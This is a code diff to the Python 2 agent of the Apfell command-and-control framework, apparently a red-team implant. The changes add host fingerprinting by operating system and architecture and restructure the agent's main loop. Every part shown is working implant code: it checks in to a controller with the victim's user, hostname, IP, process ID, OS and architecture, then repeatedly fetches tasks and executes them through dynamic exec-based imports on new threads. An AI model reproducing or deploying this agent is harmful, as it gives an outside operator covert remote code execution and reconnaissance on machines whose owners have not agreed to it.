@@ -8,7 +8,9 @@ from io import BytesIO
 import sys
 import imp
 import thread
+import platform
 import importlib
+import json
 
 # HELPER FUNCTIONS
 def get_ip():
@@ -22,6 +24,19 @@ def get_ip():
     finally:
         s.close()
     return IP
+
+def get_os():
+    system = platform.system()
+    if system == "Darwin":
+        system += " " + platform.mac_ver()[0]
+    elif system == "Linux":
+        system = " ".join(platform.linux_distribution())
+    else:
+        system = " ".join(platform.win32_ver())
+    return system
+
+def get_arch():
+    return platform.machine()
 
 class ZipImporter(object):
     def __init__(self, zip_file):
@@ -118,49 +133,43 @@ COMMANDS_HERE
 # c2 profile code
 C2PROFILE_HERE
 # MAIN LOGIC
-apfell = Apfell()
-c2 = C2()
+if __name__ == "__main__":
+    apfell = Apfell()
+    c2 = C2()
 
-# load testing
-#f = open("./commands/load.zip", 'rb')
-#data = f.read()
-#f.close()
-
-#apfell.load_zip(data, "load")
-
-c2.checkin(user=getuser(), pid=getpid(), host=gethostname(), ip=get_ip())
-while True:
-    try:
-        c2.wait()
+    c2.checkin(user=getuser(), pid=getpid(), host=gethostname(), ip=get_ip(), os=get_os(), arch=get_arch())
+    while True:
         try:
-            task = c2.get_task()
-        except Exception as e:
-            continue
-        #print(task)
-        if task['command'] != "none":
-            # process the tasking
+            c2.wait()
             try:
-                try:
-                    reload(sys.modules['{}'.format(task['command'])])
-                except Exception as e:
-                    #print(str(e))
-                    pass
-                try:
-                    exec "from {} import {}".format(task['command'], task['command'])
-                except Exception as e:
-                    #print(str(e))
-                    pass
-                #print(locals())
-                #print(globals())
-                t = thread.start_new_thread(locals()["{}".format(task['command'])],(apfell, c2, task['params'], task['id']))
-                apfell.add_job(task_id=task['id'], task=task)
-            except KeyError as e:
-                c2.post_response(response="Command not found: {}".format(str(e)), task_id=task['id'])
+                task = c2.get_task()
             except Exception as e:
-                c2.post_response(response=str(e), task_id=task['id'])
-            ## locals()['func name'](task['params'], task['task_id'])
-    except KeyboardInterrupt:
-        exit()
-    except Exception as e:
-        #print(str(e))
-        continue
+                continue
+            #print(task)
+            if task['command'] != "none":
+                # process the tasking
+                try:
+                    try:
+                        reload(sys.modules['{}'.format(task['command'])])
+                    except Exception as e:
+                        #print(str(e))
+                        pass
+                    try:
+                        exec "from {} import {}".format(task['command'], task['command'])
+                    except Exception as e:
+                        #print(str(e))
+                        pass
+                    #print(locals())
+                    #print(globals())
+                    t = thread.start_new_thread(locals()["{}".format(task['command'])],(apfell, c2, task['params'], task['id']))
+                    apfell.add_job(task_id=task['id'], task=task)
+                except KeyError as e:
+                    c2.post_response(response=json.dumps({"user_output": "Command not found: {}".format(str(e)), "completed": True, "status": "error"}), task_id=task['id'])
+                except Exception as e:
+                    c2.post_response(response=json.dumps({"user_output": str(e), "completed": True, "status": "error"}), task_id=task['id'])
+                ## locals()['func name'](task['params'], task['task_id'])
+        except KeyboardInterrupt:
+            exit()
+        except Exception as e:
+            #print(str(e))
+            continue
